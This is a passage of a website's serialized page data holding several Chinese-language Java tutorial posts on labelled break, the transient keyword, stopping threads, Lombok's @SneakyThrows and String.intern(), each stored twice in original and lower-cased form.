i++) {\n            label2:\n            if (i > 0) {\n                if (i > 8) {\n                    break label1;\n                }\n                System.out.print(i + " ");\n                if (i > 3) {\n                    break label2;\n                }\n                System.out.print(" if end ");\n\n            }\n\n            label3: {\n                if (i > 5) {\n                    break label3;\n                }\n                System.out.print(", label3 block");\n            }\n            System.out.println(", for end ");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n * 以下是输出结果：\n\n, label3 block, for end \n1  if end , label3 block, for end \n2  if end , label3 block, for end \n3  if end , label3 block, for end \n4 , label3 block, for end \n5 , label3 block, for end \n6 , for end \n7 , for end \n8 , for end \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n不难看出，这其实就是满足条件跳出给定label的代码块。不再执行。和单独的break其实类似，单独的break作用于循环，带label的break作用于你定义的代码块。但是有一点，break label的位置一定要在label代码块的内部。否则无效，语法错误。',normalizedContent:' * 是这样的，今天看rocketmq的client的时候，里面出现了一个写java没有看到过的东西 - - 记录一下。\n * 也是就是带标签的break； rocketmq的client中的使用\n\n`while(true) {\n\tlabel122: {\n\t  switch(communicationmode) {\n\t\t\tcase async:\n\t\t\t\treturn null;\n\t\t\tcase oneway:\n\t\t\t\treturn null;\n\t\t\tcase sync:\n\t\t\t\tif () {\n\t\t\t\t\treturn sendresult;\n\t\t\t\t}\n\t\t\tdefault:\n\t\t\t\tbreak label122;\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 其实很容易理解：就是标记代码块为label122 当执行到default的时候break到代码块执行。\n * 怎么用呢？\n\npublic class main {\n    public static void main(string[] args) {\n        label1:\n        for (int i = 0; i < 10; i++) {\n            label2:\n            if (i > 0) {\n                if (i > 8) {\n                    break label1;\n                }\n                system.out.print(i + " ");\n                if (i > 3) {\n                    break label2;\n                }\n                system.out.print(" if end ");\n\n            }\n\n            label3: {\n                if (i > 5) {\n                    break label3;\n                }\n                system.out.print(", label3 block");\n            }\n            system.out.println(", for end ");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n * 以下是输出结果：\n\n, label3 block, for end \n1  if end , label3 block, for end \n2  if end , label3 block, for end \n3  if end , label3 block, for end \n4 , label3 block, for end \n5 , label3 block, for end \n6 , for end \n7 , for end \n8 , for end \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n不难看出，这其实就是满足条件跳出给定label的代码块。不再执行。和单独的break其实类似，单独的break作用于循环，带label的break作用于你定义的代码块。但是有一点，break label的位置一定要在label代码块的内部。否则无效，语法错误。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java正则表达式",frontmatter:{title:"java正则表达式",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/2ccc12/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/05.java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",relativePath:"04.java/01.基础/05.java正则表达式.md",key:"v-1be156df",path:"/pages/2ccc12/",headersStr:null,content:"这个课不错：java正则表达式 但是最后涉及到java的正则表达式的一些类的使用的时候，视频糊了",normalizedContent:"这个课不错：java正则表达式 但是最后涉及到java的正则表达式的一些类的使用的时候，视频糊了",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java中的关键字 transient",frontmatter:{title:"java中的关键字 transient",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/328c06/",categories:["java","基础"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/06.java%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%20transient.html",relativePath:"04.java/01.基础/06.java中的关键字 transient.md",key:"v-04d25b96",path:"/pages/328c06/",headersStr:null,content:"这个关键字的作用其实我在写java的序列化机制中曾经写过，不过那时候只是简单地认识，只要其简单的用法，没有深入的去分析。这篇文章就是去深入分析一下transient关键字。\n\n先给出这篇文章的大致脉络\n\n首先，介绍了transient的基本概念和基本用法、然后，介绍深入分析一下transient关键字，并介绍几个需要掌握的问题最后，来个总结\n\n一、初识transient关键字\n\n其实这个关键字的作用很好理解，就是简单的一句话：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化。\n\n概念也很好理解，下面使用代码去验证一下：\n\n然后我们在Test中去验证一下：\n\n从上面可以看出，在序列化SerializeUser方法中，首先创建一个序列化user类，然后将其写入到G://Test/template路径中。在反序列化DeSerializeUser方法中，首先创建一个File，然后读取G://Test/template路径中的数据。\n\n这就是序列化和反序列化的基本实现，而且我们看一下结果，也就是被transient关键字修饰的age属性是否被序列化。\n\n从上面的这张图可以看出，age属性变为了0，说明被transient关键字修饰之后没有被序列化。\n\n二、深入分析transient关键字\n\n为了更加深入的去分析transient关键字，我们需要带着几个问题去解读：\n\n（1）transient底层实现的原理是什么？\n\n（2）被transient关键字修饰过得变量真的不能被序列化嘛？\n\n（3）静态变量能被序列化吗？被transient关键字修饰之后呢？\n\n带着这些问题一个一个来解决：\n\n1、transient底层实现原理是什么？\n\njava的serialization提供了一个非常棒的存储对象状态的机制，说白了serialization就是把对象的状态存储到硬盘上 去，等需要的时候就可以再把它读出来使用。有些时候像银行卡号这些字段是不希望在网络上传输的，transient的作用就是把这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化，意思是transient修饰的age字段，他的生命周期仅仅在内存中，不会被写到磁盘中。\n\n2、被transient关键字修饰过得变量真的不能被序列化嘛？\n\n想要解决这个问题，首先还要再重提一下对象的序列化方式：\n\nJava序列化提供两种方式。\n\n一种是实现Serializable接口\n\n另一种是实现Exteranlizable接口。 需要重写writeExternal和readExternal方法，它的效率比Serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低。\n\n从上面的这两种序列化方式，我想你已经看到了，使用Exteranlizable接口实现序列化时，我们自己指定那些属性是需要序列化的，即使是transient修饰的。下面就验证一下\n\n首先我们定义User1类：这个类是被Externalizable接口修饰的\n\n然后我们就可以测试了\n\n上面，代码分了两个方法，一个是序列化，一个是反序列化。里面的代码和一开始给出的差不多，只不过，User1里面少了age这个属性。\n\n然后看一下结果：\n\n结果基本上验证了我们的猜想，也就是说，实现了Externalizable接口，哪一个属性被序列化使我们手动去指定的，即使是transient关键字修饰也不起作用。\n\n3、静态变量能被序列化吗？没被transient关键字修饰之后呢？\n\n这个我可以提前先告诉结果，静态变量是不会被序列化的，即使没有transient关键字修饰。下面去验证一下，然后再解释原因。\n\n首先，在User类中对age属性添加transient关键字和static关键字修饰。\n\n然后，在Test类中去测试\n\n最后，测试一下，看看结果\n\n结果已经很明显了。现在解释一下，为什么会是这样，其实在前面已经提到过了。因为静态变量在全局区,本来流里面就没有写入静态变量,我打印静态变量当然会去全局区查找,而我们的序列化是写到磁盘上的，所以JVM查找这个静态变量的值，是从全局区查找的，而不是磁盘上。user.setAge(18);年龄改成18之后，被写到了全局区，其实就是方法区，只不过被所有的线程共享的一块空间。因此可以总结一句话：\n\n静态变量不管是不是transient关键字修饰，都不会被序列化\n\n三、transient关键字总结\n\njava 的transient关键字为我们提供了便利，你只需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。像银行卡、密码等等这些数据。这个需要根据业务情况了。",normalizedContent:"这个关键字的作用其实我在写java的序列化机制中曾经写过，不过那时候只是简单地认识，只要其简单的用法，没有深入的去分析。这篇文章就是去深入分析一下transient关键字。\n\n先给出这篇文章的大致脉络\n\n首先，介绍了transient的基本概念和基本用法、然后，介绍深入分析一下transient关键字，并介绍几个需要掌握的问题最后，来个总结\n\n一、初识transient关键字\n\n其实这个关键字的作用很好理解，就是简单的一句话：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化。\n\n概念也很好理解，下面使用代码去验证一下：\n\n然后我们在test中去验证一下：\n\n从上面可以看出，在序列化serializeuser方法中，首先创建一个序列化user类，然后将其写入到g://test/template路径中。在反序列化deserializeuser方法中，首先创建一个file，然后读取g://test/template路径中的数据。\n\n这就是序列化和反序列化的基本实现，而且我们看一下结果，也就是被transient关键字修饰的age属性是否被序列化。\n\n从上面的这张图可以看出，age属性变为了0，说明被transient关键字修饰之后没有被序列化。\n\n二、深入分析transient关键字\n\n为了更加深入的去分析transient关键字，我们需要带着几个问题去解读：\n\n（1）transient底层实现的原理是什么？\n\n（2）被transient关键字修饰过得变量真的不能被序列化嘛？\n\n（3）静态变量能被序列化吗？被transient关键字修饰之后呢？\n\n带着这些问题一个一个来解决：\n\n1、transient底层实现原理是什么？\n\njava的serialization提供了一个非常棒的存储对象状态的机制，说白了serialization就是把对象的状态存储到硬盘上 去，等需要的时候就可以再把它读出来使用。有些时候像银行卡号这些字段是不希望在网络上传输的，transient的作用就是把这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化，意思是transient修饰的age字段，他的生命周期仅仅在内存中，不会被写到磁盘中。\n\n2、被transient关键字修饰过得变量真的不能被序列化嘛？\n\n想要解决这个问题，首先还要再重提一下对象的序列化方式：\n\njava序列化提供两种方式。\n\n一种是实现serializable接口\n\n另一种是实现exteranlizable接口。 需要重写writeexternal和readexternal方法，它的效率比serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低。\n\n从上面的这两种序列化方式，我想你已经看到了，使用exteranlizable接口实现序列化时，我们自己指定那些属性是需要序列化的，即使是transient修饰的。下面就验证一下\n\n首先我们定义user1类：这个类是被externalizable接口修饰的\n\n然后我们就可以测试了\n\n上面，代码分了两个方法，一个是序列化，一个是反序列化。里面的代码和一开始给出的差不多，只不过，user1里面少了age这个属性。\n\n然后看一下结果：\n\n结果基本上验证了我们的猜想，也就是说，实现了externalizable接口，哪一个属性被序列化使我们手动去指定的，即使是transient关键字修饰也不起作用。\n\n3、静态变量能被序列化吗？没被transient关键字修饰之后呢？\n\n这个我可以提前先告诉结果，静态变量是不会被序列化的，即使没有transient关键字修饰。下面去验证一下，然后再解释原因。\n\n首先，在user类中对age属性添加transient关键字和static关键字修饰。\n\n然后，在test类中去测试\n\n最后，测试一下，看看结果\n\n结果已经很明显了。现在解释一下，为什么会是这样，其实在前面已经提到过了。因为静态变量在全局区,本来流里面就没有写入静态变量,我打印静态变量当然会去全局区查找,而我们的序列化是写到磁盘上的，所以jvm查找这个静态变量的值，是从全局区查找的，而不是磁盘上。user.setage(18);年龄改成18之后，被写到了全局区，其实就是方法区，只不过被所有的线程共享的一块空间。因此可以总结一句话：\n\n静态变量不管是不是transient关键字修饰，都不会被序列化\n\n三、transient关键字总结\n\njava 的transient关键字为我们提供了便利，你只需要实现serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。像银行卡、密码等等这些数据。这个需要根据业务情况了。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Java终止线程的三种方式",frontmatter:{title:"Java终止线程的三种方式",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/a60cf2/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/07.Java%E7%BB%88%E6%AD%A2%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F.html",relativePath:"04.java/01.基础/07.Java终止线程的三种方式.md",key:"v-22ab50af",path:"/pages/a60cf2/",headers:[{level:2,title:"1. 使用标志位终止线程",slug:"_1-使用标志位终止线程",normalizedTitle:"1. 使用标志位终止线程",charIndex:189},{level:2,title:"2. 使用 stop() 终止线程",slug:"_2-使用-stop-终止线程",normalizedTitle:"2. 使用 stop() 终止线程",charIndex:894},{level:2,title:"3. 使用 interrupt() 中断线程",slug:"_3-使用-interrupt-中断线程",normalizedTitle:"3. 使用 interrupt() 中断线程",charIndex:1569}],headersStr:"1. 使用标志位终止线程 2. 使用 stop() 终止线程 3. 使用 interrupt() 中断线程",content:'停止一个线程通常意味着在线程处理任务完成之前停掉正在做的操作，也就是放弃当前的操作。\n\n在 Java 中有以下 3 种方法可以终止正在运行的线程：\n\n 1. 使用退出标志，使线程正常退出，也就是当 run() 方法完成后线程中止。\n 2. 使用 stop() 方法强行终止线程，但是不推荐使用这个方法，该方法已被弃用。\n 3. 使用 interrupt 方法中断线程。\n\n\n# 1. 使用标志位终止线程\n\n在 run() 方法执行完毕后，该线程就终止了。但是在某些特殊的情况下，run() 方法会被一直执行；比如在服务端程序中可能会使用 while(true) { ... } 这样的循环结构来不断的接收来自客户端的请求。此时就可以用修改标志位的方式来结束 run() 方法。\n\npublic class ServerThread extends Thread {\n    //volatile修饰符用来保证其它线程读取的总是该变量的最新的值\n    public volatile boolean exit = false; \n\n    @Override\n    public void run() {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while(!exit){\n            serverSocket.accept(); //阻塞等待客户端消息\n            ...\n        }\n    }\n    \n    public static void main(String[] args) {\n        ServerThread t = new ServerThread();\n        t.start();\n        ...\n        t.exit = true; //修改标志位，退出线程\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 2. 使用 stop() 终止线程\n\n通过查看 JDK 的 API，我们会看到 java.lang.Thread 类型提供了一系列的方法如 start()、stop()、resume()、suspend()、destory()等方法来管理线程。但是除了 start() 之外，其它几个方法都被声名为已过时（deprecated）。\n\n虽然 stop() 方法确实可以停止一个正在运行的线程，但是这个方法是不安全的，而且该方法已被弃用，最好不要使用它。 JDK 文档中还引入用一篇文章来解释了弃用这些方法的原因：《Why are Thread.stop, Thread.suspend and Thread.resume Deprecated?》\n\n为什么弃用stop：\n\n 1. 调用 stop() 方法会立刻停止 run() 方法中剩余的全部工作，包括在 catch 或 finally 语句中的，并抛出ThreadDeath异常(通常情况下此异常不需要显示的捕获)，因此可能会导致一些清理性的工作的得不到完成，如文件，数据库等的关闭。\n 2. 调用 stop() 方法会立即释放该线程所持有的所有的锁，导致数据得不到同步，出现数据不一致的问题。\n\n例如，存在一个对象 u 持有 ID 和 NAME 两个字段，假如写入线程在写对象的过程中，只完成了对 ID 的赋值，但没来得及为 NAME 赋值，就被 stop() 导致锁被释放，那么当读取线程得到锁之后再去读取对象 u 的 ID 和 Name 时，就会出现数据不一致的问题，如下图：\n\n\n\n\n# 3. 使用 interrupt() 中断线程\n\n现在我们知道了使用 stop() 方式停止线程是非常不安全的方式，那么我们应该使用什么方法来停止线程呢？答案就是使用 interrupt() 方法来中断线程。\n\n需要明确的一点的是：interrupt() 方法并不像在 for 循环语句中使用 break 语句那样干脆，马上就停止循环。调用 interrupt() 方法仅仅是在当前线程中打一个停止的标记，并不是真的停止线程。\n\n也就是说，线程中断并不会立即终止线程，而是通知目标线程，有人希望你终止。至于目标线程收到通知后会如何处理，则完全由目标线程自行决定。这一点很重要，如果中断后，线程立即无条件退出，那么我们又会遇到 stop() 方法的老问题。\n\n事实上，如果一个线程不能被 interrupt，那么 stop 方法也不会起作用。\n\n我们来看一个使用 interrupt() 的例子：\n\npublic class InterruptThread1 extends Thread{\n\n    public static void main(String[] args) {\n        try {\n            InterruptThread1 t = new InterruptThread1();\n            t.start();\n            Thread.sleep(200);\n            t.interrupt();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        super.run();\n        for(int i = 0; i <= 200000; i++) {\n            System.out.println("i=" + i);\n        }\n    }\n    \n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n输出：\n\n\n\n从输出的结果我们会发现 interrupt 方法并没有停止线程 t 中的处理逻辑，也就是说即使 t 线程被设置为了中断状态，但是这个中断并不会起作用，那么该如何停止线程呢？\n\n这就需要使用到另外两个与线程中断有关的方法了：\n\npublic boolean Thread.isInterrupted() //判断是否被中断\npublic static boolean Thread.interrupted() //判断是否被中断，并清除当前中断状态 \n\n\n1\n2\n\n\n这两个方法使得当前线程能够感知到是否被中断了（通过检查标志位）。\n\n所以如果希望线程 t 在中断后停止，就必须先判断是否被中断，并为它增加相应的中断处理代码：\n\n@Override\npublic void run() {\n    super.run();\n    for(int i = 0; i <= 200000; i++) {\n        //判断是否被中断\n        if(Thread.currentThread().isInterrupted()){\n            //处理中断逻辑\n            break;\n        }\n        System.out.println("i=" + i);\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n输出结果，for 循环在执行完成前就提前结束了：\n\n在上面这段代码中，我们增加了 Thread.isInterrupted() 来判断当前线程是否被中断了，如果是，则退出 for 循环，结束线程。\n\n这种方式看起来与之前介绍的“使用标志位终止线程”非常类似，但是在遇到 sleep() 或者 wait() 这样的操作，我们只能通过中断来处理了。\n\npublic static native void sleep(long millis) throws InterruptedException\n\nThread.sleep() 方法会抛出一个 InterruptedException 异常，当线程被 sleep() 休眠时，如果被中断，这会就抛出这个异常。 （注意：Thread.sleep() 方法由于中断而抛出的异常，是会清除中断标记的。）',normalizedContent:'停止一个线程通常意味着在线程处理任务完成之前停掉正在做的操作，也就是放弃当前的操作。\n\n在 java 中有以下 3 种方法可以终止正在运行的线程：\n\n 1. 使用退出标志，使线程正常退出，也就是当 run() 方法完成后线程中止。\n 2. 使用 stop() 方法强行终止线程，但是不推荐使用这个方法，该方法已被弃用。\n 3. 使用 interrupt 方法中断线程。\n\n\n# 1. 使用标志位终止线程\n\n在 run() 方法执行完毕后，该线程就终止了。但是在某些特殊的情况下，run() 方法会被一直执行；比如在服务端程序中可能会使用 while(true) { ... } 这样的循环结构来不断的接收来自客户端的请求。此时就可以用修改标志位的方式来结束 run() 方法。\n\npublic class serverthread extends thread {\n    //volatile修饰符用来保证其它线程读取的总是该变量的最新的值\n    public volatile boolean exit = false; \n\n    @override\n    public void run() {\n        serversocket serversocket = new serversocket(8080);\n        while(!exit){\n            serversocket.accept(); //阻塞等待客户端消息\n            ...\n        }\n    }\n    \n    public static void main(string[] args) {\n        serverthread t = new serverthread();\n        t.start();\n        ...\n        t.exit = true; //修改标志位，退出线程\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 2. 使用 stop() 终止线程\n\n通过查看 jdk 的 api，我们会看到 java.lang.thread 类型提供了一系列的方法如 start()、stop()、resume()、suspend()、destory()等方法来管理线程。但是除了 start() 之外，其它几个方法都被声名为已过时（deprecated）。\n\n虽然 stop() 方法确实可以停止一个正在运行的线程，但是这个方法是不安全的，而且该方法已被弃用，最好不要使用它。 jdk 文档中还引入用一篇文章来解释了弃用这些方法的原因：《why are thread.stop, thread.suspend and thread.resume deprecated?》\n\n为什么弃用stop：\n\n 1. 调用 stop() 方法会立刻停止 run() 方法中剩余的全部工作，包括在 catch 或 finally 语句中的，并抛出threaddeath异常(通常情况下此异常不需要显示的捕获)，因此可能会导致一些清理性的工作的得不到完成，如文件，数据库等的关闭。\n 2. 调用 stop() 方法会立即释放该线程所持有的所有的锁，导致数据得不到同步，出现数据不一致的问题。\n\n例如，存在一个对象 u 持有 id 和 name 两个字段，假如写入线程在写对象的过程中，只完成了对 id 的赋值，但没来得及为 name 赋值，就被 stop() 导致锁被释放，那么当读取线程得到锁之后再去读取对象 u 的 id 和 name 时，就会出现数据不一致的问题，如下图：\n\n\n\n\n# 3. 使用 interrupt() 中断线程\n\n现在我们知道了使用 stop() 方式停止线程是非常不安全的方式，那么我们应该使用什么方法来停止线程呢？答案就是使用 interrupt() 方法来中断线程。\n\n需要明确的一点的是：interrupt() 方法并不像在 for 循环语句中使用 break 语句那样干脆，马上就停止循环。调用 interrupt() 方法仅仅是在当前线程中打一个停止的标记，并不是真的停止线程。\n\n也就是说，线程中断并不会立即终止线程，而是通知目标线程，有人希望你终止。至于目标线程收到通知后会如何处理，则完全由目标线程自行决定。这一点很重要，如果中断后，线程立即无条件退出，那么我们又会遇到 stop() 方法的老问题。\n\n事实上，如果一个线程不能被 interrupt，那么 stop 方法也不会起作用。\n\n我们来看一个使用 interrupt() 的例子：\n\npublic class interruptthread1 extends thread{\n\n    public static void main(string[] args) {\n        try {\n            interruptthread1 t = new interruptthread1();\n            t.start();\n            thread.sleep(200);\n            t.interrupt();\n        } catch (interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n\n    @override\n    public void run() {\n        super.run();\n        for(int i = 0; i <= 200000; i++) {\n            system.out.println("i=" + i);\n        }\n    }\n    \n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n输出：\n\n\n\n从输出的结果我们会发现 interrupt 方法并没有停止线程 t 中的处理逻辑，也就是说即使 t 线程被设置为了中断状态，但是这个中断并不会起作用，那么该如何停止线程呢？\n\n这就需要使用到另外两个与线程中断有关的方法了：\n\npublic boolean thread.isinterrupted() //判断是否被中断\npublic static boolean thread.interrupted() //判断是否被中断，并清除当前中断状态 \n\n\n1\n2\n\n\n这两个方法使得当前线程能够感知到是否被中断了（通过检查标志位）。\n\n所以如果希望线程 t 在中断后停止，就必须先判断是否被中断，并为它增加相应的中断处理代码：\n\n@override\npublic void run() {\n    super.run();\n    for(int i = 0; i <= 200000; i++) {\n        //判断是否被中断\n        if(thread.currentthread().isinterrupted()){\n            //处理中断逻辑\n            break;\n        }\n        system.out.println("i=" + i);\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n输出结果，for 循环在执行完成前就提前结束了：\n\n在上面这段代码中，我们增加了 thread.isinterrupted() 来判断当前线程是否被中断了，如果是，则退出 for 循环，结束线程。\n\n这种方式看起来与之前介绍的“使用标志位终止线程”非常类似，但是在遇到 sleep() 或者 wait() 这样的操作，我们只能通过中断来处理了。\n\npublic static native void sleep(long millis) throws interruptedexception\n\nthread.sleep() 方法会抛出一个 interruptedexception 异常，当线程被 sleep() 休眠时，如果被中断，这会就抛出这个异常。 （注意：thread.sleep() 方法由于中断而抛出的异常，是会清除中断标记的。）',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Lombok注解-@SneakyThrows",frontmatter:{title:"Lombok注解-@SneakyThrows",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/3da978/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/08.Lombok%E6%B3%A8%E8%A7%A3-@SneakyThrows.html",relativePath:"04.java/01.基础/08.Lombok注解-@SneakyThrows.md",key:"v-3d83cf96",path:"/pages/3da978/",headers:[{level:5,title:"原理",slug:"原理",normalizedTitle:"原理",charIndex:1307}],headersStr:"原理",content:'@SneakyThrows注解的用途得从java的异常设计体系说起。 java中我们常见的2类异常。 1.普通Exception类,也就是我们常说的受检异常或者Checked Exception。 2.RuntimeException类，既运行时异常。 前者会强制要求抛出它的方法声明throws，调用者必须显示的去处理这个异常。设计的目的是为了提醒开发者处理一些场景中必然可能存在的异常情况。比如网络异常造成IOException。\n\n但是现实，往往事与愿违。大部分情况下的异常，我们都是一路往外抛了事。（强制处理我也处理不了啊！臣妾做不到）所以渐渐的java程序员处理Exception的常见手段就是外面包一层RuntimeException，接着往上丢。这种解决思想尤其在Spring中到处出现。参见《Spring in Action》\n\ntry{\n}catch(Exception e){\nthrow new RuntimeException(e);\n} \n\n\n1\n2\n3\n4\n\n\nLombok的@SneakyThrows就是为了消除这样的模板代码。 使用注解后不需要担心Exception的处理\n\n import lombok.SneakyThrows;\n\npublic class SneakyThrowsExample implements Runnable {\n  @SneakyThrows(UnsupportedEncodingException.class)\n  public String utf8ToString(byte[] bytes) {\n    return new String(bytes, "UTF-8");\n  }\n  \n  @SneakyThrows\n  public void run() {\n    throw new Throwable();\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n真正生成的代码\n\nimport lombok.Lombok;\n\npublic class SneakyThrowsExample implements Runnable {\n  public String utf8ToString(byte[] bytes) {\n    try {\n      return new String(bytes, "UTF-8");\n    } catch (UnsupportedEncodingException e) {\n      throw Lombok.sneakyThrow(e);\n    }\n  }\n  \n  public void run() {\n    try {\n      throw new Throwable();\n    } catch (Throwable t) {\n      throw Lombok.sneakyThrow(t);\n    }\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 原理\n\n显然魔法 藏在Lombok.sneakyThrow(t);中。可能大家都会以为这个方法就是new RuntimeException()之类的。然而事实并非如此。阅读代码可以看出整个方法其实最核心的逻辑是throw (T)t;，利用泛型将我们传入的Throwable强转为RuntimeException。虽然事实上我们不是RuntimeException。但是没关系。因为JVM并不关心这个。泛型最后存储为字节码时并没有泛型的信息。这样写只是为了骗过javac编译器。源码中注释有解释。\n\n public static RuntimeException sneakyThrow(Throwable t) {\n        if (t == null) throw new NullPointerException("t");\n        return Lombok.<RuntimeException>sneakyThrow0(t);\n    }\n\n    private static <T extends Throwable> T sneakyThrow0(Throwable t) throws T {\n        throw (T)t;\n    } \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'@sneakythrows注解的用途得从java的异常设计体系说起。 java中我们常见的2类异常。 1.普通exception类,也就是我们常说的受检异常或者checked exception。 2.runtimeexception类，既运行时异常。 前者会强制要求抛出它的方法声明throws，调用者必须显示的去处理这个异常。设计的目的是为了提醒开发者处理一些场景中必然可能存在的异常情况。比如网络异常造成ioexception。\n\n但是现实，往往事与愿违。大部分情况下的异常，我们都是一路往外抛了事。（强制处理我也处理不了啊！臣妾做不到）所以渐渐的java程序员处理exception的常见手段就是外面包一层runtimeexception，接着往上丢。这种解决思想尤其在spring中到处出现。参见《spring in action》\n\ntry{\n}catch(exception e){\nthrow new runtimeexception(e);\n} \n\n\n1\n2\n3\n4\n\n\nlombok的@sneakythrows就是为了消除这样的模板代码。 使用注解后不需要担心exception的处理\n\n import lombok.sneakythrows;\n\npublic class sneakythrowsexample implements runnable {\n  @sneakythrows(unsupportedencodingexception.class)\n  public string utf8tostring(byte[] bytes) {\n    return new string(bytes, "utf-8");\n  }\n  \n  @sneakythrows\n  public void run() {\n    throw new throwable();\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n真正生成的代码\n\nimport lombok.lombok;\n\npublic class sneakythrowsexample implements runnable {\n  public string utf8tostring(byte[] bytes) {\n    try {\n      return new string(bytes, "utf-8");\n    } catch (unsupportedencodingexception e) {\n      throw lombok.sneakythrow(e);\n    }\n  }\n  \n  public void run() {\n    try {\n      throw new throwable();\n    } catch (throwable t) {\n      throw lombok.sneakythrow(t);\n    }\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 原理\n\n显然魔法 藏在lombok.sneakythrow(t);中。可能大家都会以为这个方法就是new runtimeexception()之类的。然而事实并非如此。阅读代码可以看出整个方法其实最核心的逻辑是throw (t)t;，利用泛型将我们传入的throwable强转为runtimeexception。虽然事实上我们不是runtimeexception。但是没关系。因为jvm并不关心这个。泛型最后存储为字节码时并没有泛型的信息。这样写只是为了骗过javac编译器。源码中注释有解释。\n\n public static runtimeexception sneakythrow(throwable t) {\n        if (t == null) throw new nullpointerexception("t");\n        return lombok.<runtimeexception>sneakythrow0(t);\n    }\n\n    private static <t extends throwable> t sneakythrow0(throwable t) throws t {\n        throw (t)t;\n    } \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"intern()",frontmatter:{title:"intern()",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/e8f31e/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/09.String.intern().html",relativePath:"04.java/01.基础/09.String.intern().md",key:"v-d14288e2",path:"/pages/e8f31e/",headersStr:null,content:"String.intern() 方法可以使得所有含相同内容的字符串都共享同一个内存对象。\n\nJVM 中，存在一个字符串常量池，字符串的值都存放在这个池中。当调用 intern 方法时，如果字符串常量池中已经存在该字符串，那么返回池中的字符串；否则将此字符串添加到字符串常量池中，并返回字符串的引用。\n\nJDK1.6 和 JDK1.7 在 intern() 方法的实现上，有相同，也有不同。\n\n相同点： 先去查看字符串常量池是否有该字符串，如果有，则返回字符串常量池中的引用。 不同点： 如果是 JDK1.7，当字符串常量池中找不到对应的字符串时，不会将字符串拷贝到字符串常量池，而只是生成一个对该字符串的引用在字符串常量池。而 JDK1.6 会拷贝字符串至字符串常量池。\n\nJDK1.6 中，常量池在方法区。JDK1.7 中，常量池移到堆区了。\n\n\n\n注意：字符串常量池中的 String 对象，也是可以被 GC 回收的，只要它不再被引用了。\n\nString.intern 